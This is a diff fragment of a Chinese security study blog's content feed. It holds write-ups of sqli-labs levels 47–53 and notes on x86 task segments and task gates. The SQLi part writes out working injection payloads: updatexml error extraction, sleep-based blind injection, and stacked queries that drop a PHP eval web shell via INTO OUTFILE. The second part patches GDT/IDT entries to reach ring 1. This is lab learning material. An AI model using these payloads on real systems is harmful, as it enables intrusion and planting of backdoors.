+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功爆出库</p>
+<hr>
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这次是盲注，没有报错提示不能使用报错注入<br>走一波时间盲注<br>探测为数字型<br>构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">2</span>)))aaaa)) # </span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>同上，先判断闭合方式再构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||if(1=2,1,(select(1)from(select(sleep(2)))aaaa)) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功</p>
+<hr>
+<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>探测闭合为数字型后直接</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
+<p>居然成功了<br>然后感觉不太对，emmm<br>看了看源码发现</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">···</span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+<p>这里执行sql语句的函数是mysqli_multi_query(),可以一次执行多条语句<br>也就是之前的堆叠注入，这里不再演示</p>
+<hr>
+<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>同上，先判断闭合方式再构造注入语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1);select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>成功<br>同样这也是用mysqli_multi_query()<br>存在堆叠注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-51/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这一题是盲注<br>其余同上，直接贴语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> ;<span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-52/1.php&quot;; <span class="comment">-- d d</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>同上，直接贴语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-53/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<hr>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透</tag>
+        <tag>sqli-lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>任务段，任务门练习</title>
+    <url>/2021/02/08/%E4%BB%BB%E5%8A%A1%E6%AE%B5%EF%BC%8C%E4%BB%BB%E5%8A%A1%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="0x00-任务段"><a href="#0x00-任务段" class="headerlink" title="0x00 任务段"></a>0x00 任务段</h1><blockquote>
+<p>TSS</p>
+</blockquote>
+<p>是一块大小为0X68的内存，用来替换一堆寄存器</p>
+<blockquote>
+<p>TR寄存器</p>
+</blockquote>
+<p>段选择子 属性 Base Limit</p>
+<p>这里的Base是指向TSS的地址，Limit则是0x68</p>
+<blockquote>
+<p>任务段描述符</p>
+</blockquote>
+<p>其中需要注意的是此时的G位为0以字节为单位，Type则是未访问的TSS段，综合下来就是XX00E9XX`XXXX0068</p>
+<a id="more"></a>
+
+<blockquote>
+<p>在R0可以用LTR为TR寄存器赋值，赋值后Type变成已被使用access，STR则只取其前16位，也就是段选择子</p>
+</blockquote>
+<blockquote>
+<p>在R3可以用call和jmp去访问任务段</p>
+</blockquote>
+<p>call和jmp在返回的时候细节也不一样</p>
+<p>call在返回的时候要看eflag的NT位，NT位为1的时候iret是以Previous Task Link CPU来返回，而NT位为0的时候则是按照当前堆栈pop返回，而断点则会使NT位清0</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD u_eflags,i_eflags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov u_eflags,ebx</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov i_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	DWORD dwCr3;</span><br><span class="line">	<span class="keyword">char</span> g_esp[<span class="number">0x1000</span>];</span><br><span class="line">	</span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,TSS);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)g_esp+<span class="number">0x800</span>; <span class="comment">//ESP</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr[buff]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x -- %x&quot;</span>,u_eflags,i_eflags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里的eflag在断下来之前是0x4002在断下来后是0x2，也就是在断下来后，NT位被清0</p>
+<p>而用jmp则eflag的NT位总为0，所以得使用堆栈来返回，我们就得自己保存好调用之前的TR寄存器的值，自己跳转回来，而LTR只是改变寄存器的值并不切换，所以我们又得使用jmp</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD u_eflags,i_eflags;</span><br><span class="line"><span class="keyword">char</span> u_tr[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">WORD tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov u_eflags,ebx</span><br><span class="line">            </span><br><span class="line">		<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov i_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		jmp fword ptr[u_tr]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	DWORD dwCr3;</span><br><span class="line">	<span class="keyword">char</span> g_esp[<span class="number">0x1000</span>];</span><br><span class="line">	</span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,TSS);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)g_esp+<span class="number">0x800</span>; <span class="comment">//ESP</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x00000008</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x00000010</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x00000030</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">xor</span> eax,eax</span><br><span class="line">		str ax</span><br><span class="line">		mov tmp,ax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>((u_tr+<span class="number">4</span>),&amp;tmp,<span class="keyword">sizeof</span>(WORD));</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		jmp fword ptr[buff]</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x -- %x&quot;</span>,u_eflags,i_eflags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>运行的结果是断下来之前是0x2在断下来后是0x2，所以就验证了jmp得自己跳转回来</p>
+<hr>
+<h1 id="0x01-任务门"><a href="#0x01-任务门" class="headerlink" title="0x01 任务门"></a>0x01 任务门</h1><p>首先是根据任务门描述符的规则来自己创建一个任务门描述符，来进到1环</p>
+<p><img src="https://i.loli.net/2021/02/09/BQqxHXbroSwNyRV.png" alt="image-20210209150127080"></p>
+<blockquote>
+<p>0000E500`00490000，写入IDT表中 </p>
+</blockquote>
+<p>eq 8003f500 0000E500`00490000</p>
+<p>这里注意任务门的DPL为3使在环下有访问的权限</p>
+<p>由于GDT表中没有权限在r1的代码段的描述符所以再自己构造一个</p>
+<blockquote>
+<p> CS1:00CFBB00`0000FFFF </p>
+</blockquote>
+<p>eq 8003f0b0 00CFBB00`0000FFFF //16 – B1</p>
+<blockquote>
+<p>SS1:00CFB300`0000FFFF </p>
+</blockquote>
+<p>eq 8003f0b8 00CFB300`0000FFFF //17 – B9</p>
+<blockquote>
+<p>FS1:FFC0B3DF`F0000001</p>
+</blockquote>
+<p>eq 8003f0c0 FFC0B3DF`F0000001 //18 – C1</p>
+<blockquote>
+<p>TSS描述符为XX00A9XX`XXXX0068</p>
+</blockquote>
+<p>eq 8003f0c0 FFC0B3DF`F0000001 //9 – 49</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">WORD cs1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) Func()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov cs1,cs</span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	DWORD dwCr3;</span><br><span class="line">	<span class="keyword">char</span> g_esp[<span class="number">0x1000</span>];</span><br><span class="line">	</span><br><span class="line">	DWORD *TSS = (DWORD*)VirtualAlloc(<span class="literal">NULL</span>,<span class="number">104</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (TSS == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,TSS);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>, &amp;dwCr3);</span><br><span class="line">	</span><br><span class="line">	TSS[<span class="number">0</span>] = <span class="number">0x00000000</span>; <span class="comment">// Previous Task Link CPU</span></span><br><span class="line">	TSS[<span class="number">1</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP0</span></span><br><span class="line">	TSS[<span class="number">2</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS0</span></span><br><span class="line">	TSS[<span class="number">3</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP1</span></span><br><span class="line">	TSS[<span class="number">4</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS1</span></span><br><span class="line">	TSS[<span class="number">5</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESP2</span></span><br><span class="line">	TSS[<span class="number">6</span>] = <span class="number">0x00000000</span>; <span class="comment">// SS2</span></span><br><span class="line">	TSS[<span class="number">7</span>] = dwCr3; <span class="comment">// CR3</span></span><br><span class="line">	TSS[<span class="number">8</span>] = (DWORD)Func; <span class="comment">// EIP</span></span><br><span class="line">	TSS[<span class="number">9</span>] = <span class="number">0x00000000</span>; <span class="comment">// EFLAGS</span></span><br><span class="line">	TSS[<span class="number">10</span>] = <span class="number">0x00000000</span>; <span class="comment">// EAX</span></span><br><span class="line">	TSS[<span class="number">11</span>] = <span class="number">0x00000000</span>; <span class="comment">// ECX</span></span><br><span class="line">	TSS[<span class="number">12</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDX</span></span><br><span class="line">	TSS[<span class="number">13</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBX</span></span><br><span class="line">	TSS[<span class="number">14</span>] = (DWORD)g_esp+<span class="number">0x800</span>; <span class="comment">//ESP</span></span><br><span class="line">	TSS[<span class="number">15</span>] = <span class="number">0x00000000</span>; <span class="comment">// EBP</span></span><br><span class="line">	TSS[<span class="number">16</span>] = <span class="number">0x00000000</span>; <span class="comment">// ESI</span></span><br><span class="line">	TSS[<span class="number">17</span>] = <span class="number">0x00000000</span>; <span class="comment">// EDI</span></span><br><span class="line">	TSS[<span class="number">18</span>] = <span class="number">0x00000023</span>; <span class="comment">// ES</span></span><br><span class="line">	TSS[<span class="number">19</span>] = <span class="number">0x000000B1</span>; <span class="comment">// CS 0x0000001B</span></span><br><span class="line">	TSS[<span class="number">20</span>] = <span class="number">0x000000B9</span>; <span class="comment">// SS 0x00000023</span></span><br><span class="line">	TSS[<span class="number">21</span>] = <span class="number">0x00000023</span>; <span class="comment">// DS</span></span><br><span class="line">	TSS[<span class="number">22</span>] = <span class="number">0x000000C1</span>; <span class="comment">// FS 0x0000003B</span></span><br><span class="line">	TSS[<span class="number">23</span>] = <span class="number">0x00000000</span>; <span class="comment">// GS</span></span><br><span class="line">	TSS[<span class="number">24</span>] = <span class="number">0x00000000</span>; <span class="comment">// LDT Segment Selector</span></span><br><span class="line">	TSS[<span class="number">25</span>] = <span class="number">0x20ac0000</span>; <span class="comment">// I/O Map Base Address</span></span><br><span class="line"></span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x20</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,cs1);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>结果是cs：B1 — 10110 0 01，CPL为1，成功进1环</p>
+]]></content>
       <tags>
         <tag>笔记</tag>
         <tag>保护模式</tag>
